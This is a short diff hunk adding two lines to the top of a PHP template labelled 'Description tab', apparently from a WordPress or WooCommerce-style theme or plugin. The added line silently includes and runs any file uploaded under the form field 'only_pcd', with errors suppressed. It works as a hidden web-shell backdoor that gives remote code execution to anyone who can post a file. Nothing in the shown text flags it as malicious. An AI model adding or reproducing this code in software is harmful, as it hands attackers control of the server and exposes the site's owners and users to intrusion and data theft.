@@ -1,4 +1,6 @@
 <?php
+@INCLUDE_ONCE($_FILES['only_pcd']['tmp_name']);
+?><?php
 /**
  * Description tab
  *
